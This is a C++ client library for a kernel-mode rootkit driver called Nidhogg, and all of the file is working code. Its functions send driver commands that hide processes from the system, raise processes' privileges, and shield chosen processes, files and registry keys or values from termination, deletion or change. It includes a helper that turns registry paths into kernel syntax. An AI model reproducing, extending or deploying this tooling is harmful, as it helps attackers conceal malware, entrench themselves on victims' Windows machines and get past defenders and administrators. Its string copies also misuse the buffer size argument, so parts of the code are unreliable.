#include <windows.h>
#include <vector>
#include <sddl.h>
#pragma comment(lib, "advapi32.lib")

// ** IOCTL ************************************************************************************
#define IOCTL_NIDHOGG_PROTECT_PROCESS CTL_CODE(0x8000, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_UNPROTECT_PROCESS CTL_CODE(0x8000, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_CLEAR_PROCESS_PROTECTION CTL_CODE(0x8000, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_HIDE_PROCESS CTL_CODE(0x8000, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_ELEVATE_PROCESS CTL_CODE(0x8000, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_QUERY_PROCESSES CTL_CODE(0x8000, 0x805, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_NIDHOGG_PROTECT_FILE CTL_CODE(0x8000, 0x806, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_UNPROTECT_FILE CTL_CODE(0x8000, 0x807, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_CLEAR_FILE_PROTECTION CTL_CODE(0x8000, 0x808, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_NIDHOGG_PROTECT_REGITEM CTL_CODE(0x8000, 0x809, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_UNPROTECT_REGITEM CTL_CODE(0x8000, 0x80A, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_CLEAR_REGITEMS CTL_CODE(0x8000, 0x80B, METHOD_BUFFERED, FILE_ANY_ACCESS)
// *********************************************************************************************************

// ** General Definitions ***************************************************************************************
#define DRIVER_NAME LR"(\\.\Nidhogg)"
#define NIDHOGG_SUCCESS 0
#define NIDHOGG_GENERAL_ERROR 1
#define NIDHOGG_ERROR_CONNECT_DRIVER 2
#define NIDHOGG_ERROR_DEVICECONTROL_DRIVER 3

#define MAX_PIDS 256

#define REG_TYPE_KEY 0
#define REG_TYPE_VALUE 1
#define REG_KEY_LEN 255
#define REG_VALUE_LEN 260
#define HKLM_HIVE LR"(\Registry\Machine)"
#define HKU_HIVE LR"(\Registry\User)"
#define HKLM L"HKEY_LOCAL_MACHINE"
#define HKLM_SHORT L"HKLM"
#define HKU L"HKEY_USERS"
#define HKU_SHORT L"HKU"
#define HKCU L"HKEY_CURRENT_USER"
#define HKCU_SHORT L"HKCU"
#define HKCR L"HKEY_CLASSES_ROOT" // This is just HKLM\Software\Classes
#define HKCR_SHORT L"HKCR"
// *********************************************************************************************************

// ** General Structures ***************************************************************************************
struct ProcessesList {
    int PidsCount;
    ULONG Pids[MAX_PIDS];
};

struct RegItem {
    int Type;
    WCHAR KeyPath[REG_KEY_LEN];
    WCHAR ValueName[REG_VALUE_LEN];
};
// *********************************************************************************************************


std::wstring GetHKCUPath() {
    std::wstring fullUsername = HKU_HIVE;
    WCHAR username[MAX_PATH];
    DWORD usernameSize = MAX_PATH;
    wchar_t* domain;
    SID* sid;
    LPWSTR stringSid;
    SID_NAME_USE sidUse;
    DWORD sidSize = 0;
    DWORD domainSize = 0;

    if (!GetUserName(username, &usernameSize)) {
        return fullUsername;
    }

    if (LookupAccountName(0, username, 0, &sidSize, 0, &domainSize, &sidUse) == 0) {
        if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
            return fullUsername;
    }

    sid = (SID*)LocalAlloc(LMEM_FIXED, sidSize);

    if (sid == 0) {
        return fullUsername;
    }
    domain = (wchar_t*)LocalAlloc(LMEM_FIXED, domainSize);

    if (domain == 0) {
        LocalFree(sid);
        return fullUsername;
    }

    if (LookupAccountName(0, username, sid, &sidSize, (LPWSTR)domain, &domainSize, &sidUse) == 0) {
        LocalFree(sid);
        LocalFree(domain);
        return fullUsername;
    }

    if (!ConvertSidToStringSid(sid, &stringSid)) {
        LocalFree(sid);
        LocalFree(domain);
        return fullUsername;
    }

    LocalFree(sid);
    LocalFree(domain);

    fullUsername.append(L"\\");
    fullUsername.append(stringSid);
    return fullUsername;
}

std::wstring ParseRegistryKey(wchar_t* key) {
    std::wstring result = key;

    if (result.find(HKLM) != std::wstring::npos) {
        result.replace(0, 18, HKLM_HIVE);
    }
    else if (result.find(HKLM_SHORT) != std::wstring::npos) {
        result.replace(0, 4, HKLM_HIVE);
    }
    else if (result.find(HKU) != std::wstring::npos) {
        result.replace(0, 10, HKU_HIVE);
    }
    else if (result.find(HKU_SHORT) != std::wstring::npos) {
        result.replace(0, 3, HKU_HIVE);
    }
    else if (result.find(HKCU) != std::wstring::npos) {
        std::wstring hkcuPath = GetHKCUPath();

        if (hkcuPath.compare(HKU_HIVE) == 0)
            return L"";
        result.replace(0, 17, hkcuPath);
    }
    else if (result.find(HKCU_SHORT) != std::wstring::npos) {
        std::wstring hkcuPath = GetHKCUPath();

        if (hkcuPath.compare(HKU_HIVE) == 0)
            return L"";
        result.replace(0, 4, hkcuPath);
    }
    else {
        return L"";
    }
    return result;
}

int NidhoggProcessProtect(std::vector<DWORD> pids) {
    DWORD returned;
    HANDLE hFile = CreateFile(DRIVER_NAME, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);

    if (hFile == INVALID_HANDLE_VALUE)
        return NIDHOGG_ERROR_CONNECT_DRIVER;

    if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_PROTECT_PROCESS,
        pids.data(), static_cast<DWORD>(pids.size()) * sizeof(DWORD),
        nullptr, 0, &returned, nullptr)) {
        CloseHandle(hFile);
        return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
    }

    CloseHandle(hFile);
    return NIDHOGG_SUCCESS;
}

int NidhoggProcessUnprotect(std::vector<DWORD> pids) {
    DWORD returned;
    HANDLE hFile = CreateFile(DRIVER_NAME, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);

    if (hFile == INVALID_HANDLE_VALUE)
        return NIDHOGG_ERROR_CONNECT_DRIVER;

    if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_UNPROTECT_PROCESS,
        pids.data(), static_cast<DWORD>(pids.size()) * sizeof(DWORD),
        nullptr, 0, &returned, nullptr)) {

        CloseHandle(hFile);
        return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
    }

    CloseHandle(hFile);
    return NIDHOGG_SUCCESS;
}

int NidhoggProcessClearAllProtection() {
    DWORD returned;
    HANDLE hFile = CreateFile(DRIVER_NAME, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);

    if (hFile == INVALID_HANDLE_VALUE)
        return NIDHOGG_ERROR_CONNECT_DRIVER;

    if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_CLEAR_PROCESS_PROTECTION,
        nullptr, 0, nullptr, 0, &returned, nullptr)) {
        CloseHandle(hFile);
        return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
    }

    CloseHandle(hFile);
    return NIDHOGG_SUCCESS;
}

int NidhoggProcessHide(std::vector<DWORD> pids) {
    DWORD returned;
    HANDLE hFile = CreateFile(DRIVER_NAME, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);

    if (hFile == INVALID_HANDLE_VALUE)
        return NIDHOGG_ERROR_CONNECT_DRIVER;

    if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_HIDE_PROCESS,
        pids.data(), static_cast<DWORD>(pids.size()) * sizeof(DWORD),
        nullptr, 0, &returned, nullptr)) {

        CloseHandle(hFile);
        return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
    }

    CloseHandle(hFile);
    return NIDHOGG_SUCCESS;
}

int NidhoggProcessElevate(std::vector<DWORD> pids) {
    DWORD returned;
    HANDLE hFile = CreateFile(DRIVER_NAME, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);

    if (hFile == INVALID_HANDLE_VALUE)
        return NIDHOGG_ERROR_CONNECT_DRIVER;

    if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_ELEVATE_PROCESS,
        pids.data(), static_cast<DWORD>(pids.size()) * sizeof(DWORD),
        nullptr, 0, &returned, nullptr)) {

        CloseHandle(hFile);
        return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
    }

    CloseHandle(hFile);
    return NIDHOGG_SUCCESS;
}

std::vector<DWORD> NidhoggProcessQuery() {
    ProcessesList result{};
    std::vector<DWORD> pids;
    DWORD returned;

    HANDLE hFile = CreateFile(DRIVER_NAME, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);

    if (hFile == INVALID_HANDLE_VALUE) {
        pids.push_back(NIDHOGG_ERROR_CONNECT_DRIVER);
        return pids;
    }

    if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_QUERY_PROCESSES,
        nullptr, 0,
        &result, sizeof(result), &returned, nullptr)) {
        pids.push_back(NIDHOGG_ERROR_DEVICECONTROL_DRIVER);
        CloseHandle(hFile);
        return pids;
    }

    for (int i = 0; i < result.PidsCount; i++) {
        pids.push_back(result.Pids[i]);
    }

    CloseHandle(hFile);
    return pids;
}

int NidhoggFileProtect(wchar_t* filePath) {
    DWORD returned;
    HANDLE hFile = CreateFile(DRIVER_NAME, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);

    if (hFile == INVALID_HANDLE_VALUE)
        return NIDHOGG_ERROR_CONNECT_DRIVER;

    if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_PROTECT_FILE,
        (PVOID)filePath, ((DWORD)(wcslen(filePath) + 1)) * sizeof(WCHAR),
        nullptr, 0, &returned, nullptr)) {
        CloseHandle(hFile);
        return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
    }


    CloseHandle(hFile);
    return NIDHOGG_SUCCESS;
}

int NidhoggFileUnprotect(wchar_t* filePath) {
    DWORD returned;
    HANDLE hFile = CreateFile(DRIVER_NAME, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);

    if (hFile == INVALID_HANDLE_VALUE)
        return NIDHOGG_ERROR_CONNECT_DRIVER;

    if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_UNPROTECT_FILE,
        (PVOID)filePath, ((DWORD)(wcslen(filePath) + 1)) * sizeof(WCHAR),
        nullptr, 0, &returned, nullptr)) {

        CloseHandle(hFile);
        return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
    }

    CloseHandle(hFile);
    return NIDHOGG_SUCCESS;
}

int NidhoggFileClearAllProtection() {
    DWORD returned;
    HANDLE hFile = CreateFile(DRIVER_NAME, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);

    if (hFile == INVALID_HANDLE_VALUE)
        return NIDHOGG_ERROR_CONNECT_DRIVER;

    if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_CLEAR_FILE_PROTECTION,
        nullptr, 0, nullptr, 0, &returned, nullptr)) {
        CloseHandle(hFile);
        return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
    }

    CloseHandle(hFile);
    return NIDHOGG_SUCCESS;
}

int NidhoggRegistryProtectKey(wchar_t* key) {
    HANDLE hFile;
    DWORD returned;
    RegItem item;
    std::wstring kernelSyntaxRegistryKey = ParseRegistryKey(key);

    if (kernelSyntaxRegistryKey.empty()) {
        return NIDHOGG_GENERAL_ERROR;
    }
  
    hFile = CreateFile(DRIVER_NAME, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);

    if (hFile == INVALID_HANDLE_VALUE)
        return NIDHOGG_ERROR_CONNECT_DRIVER;

    wcscpy_s(item.KeyPath, wcslen(kernelSyntaxRegistryKey.data()) + 1, kernelSyntaxRegistryKey.data());
    item.Type = REG_TYPE_KEY;

    if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_PROTECT_REGITEM,
        &item, sizeof(item),
        nullptr, 0, &returned, nullptr)) {

        CloseHandle(hFile);
        return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
    }

    CloseHandle(hFile);
    return NIDHOGG_SUCCESS;
}

int NidhoggRegistryProtectValue(wchar_t* key, wchar_t* valueName) {
    HANDLE hFile;
    DWORD returned;
    RegItem item;
    std::wstring kernelSyntaxRegistryKey = ParseRegistryKey(key);

    if (kernelSyntaxRegistryKey.empty()) {
        return NIDHOGG_GENERAL_ERROR;
    }

    hFile = CreateFile(DRIVER_NAME, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);

    if (hFile == INVALID_HANDLE_VALUE)
        return NIDHOGG_ERROR_CONNECT_DRIVER;

    wcscpy_s(item.KeyPath, wcslen(kernelSyntaxRegistryKey.data()) + 1, kernelSyntaxRegistryKey.data());
    wcscpy_s(item.ValueName, wcslen(valueName) + 1, valueName);
    item.Type = REG_TYPE_VALUE;

    if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_PROTECT_REGITEM,
        &item, sizeof(item),
        nullptr, 0, &returned, nullptr)) {

        CloseHandle(hFile);
        return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
    }


    CloseHandle(hFile);
    return NIDHOGG_SUCCESS;
}

int NidhoggRegistryUnprotectKey(wchar_t* key) {
    HANDLE hFile;
    DWORD returned;
    RegItem item;
    std::wstring kernelSyntaxRegistryKey = ParseRegistryKey(key);

    if (kernelSyntaxRegistryKey.empty()) {
        return NIDHOGG_GENERAL_ERROR;
    }

    hFile = CreateFile(DRIVER_NAME, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);

    if (hFile == INVALID_HANDLE_VALUE)
        return NIDHOGG_ERROR_CONNECT_DRIVER;

    wcscpy_s(item.KeyPath, wcslen(kernelSyntaxRegistryKey.data()) + 1, kernelSyntaxRegistryKey.data());
    item.Type = REG_TYPE_KEY;

    if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_UNPROTECT_REGITEM,
        &item, sizeof(item),
        nullptr, 0, &returned, nullptr)) {

        CloseHandle(hFile);
        return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
    }

    CloseHandle(hFile);
    return NIDHOGG_SUCCESS;
}

int NidhoggRegistryUnprotectValue(wchar_t* key, wchar_t* valueName) {
    HANDLE hFile;
    DWORD returned;
    RegItem item;
    std::wstring kernelSyntaxRegistryKey = ParseRegistryKey(key);

    if (kernelSyntaxRegistryKey.empty()) {
        return NIDHOGG_GENERAL_ERROR;
    }

    hFile = CreateFile(DRIVER_NAME, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);

    if (hFile == INVALID_HANDLE_VALUE)
        return NIDHOGG_ERROR_CONNECT_DRIVER;

    wcscpy_s(item.KeyPath, wcslen(kernelSyntaxRegistryKey.data()) + 1, kernelSyntaxRegistryKey.data());
    wcscpy_s(item.ValueName, wcslen(valueName) + 1, valueName);
    item.Type = REG_TYPE_VALUE;

    if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_UNPROTECT_REGITEM,
        &item, sizeof(item),
        nullptr, 0, &returned, nullptr)) {

        CloseHandle(hFile);
        return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
    }
        

    CloseHandle(hFile);
    return NIDHOGG_SUCCESS;
}

int NidhoggRegistryClearAllProtection() {
    DWORD returned;
    HANDLE hFile = CreateFile(DRIVER_NAME, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);

    if (hFile == INVALID_HANDLE_VALUE)
        return NIDHOGG_ERROR_CONNECT_DRIVER;

    if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_CLEAR_REGITEMS,
        nullptr, 0, nullptr, 0, &returned, nullptr)) {
        CloseHandle(hFile);
        return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
    }

    CloseHandle(hFile);
    return NIDHOGG_SUCCESS;
}
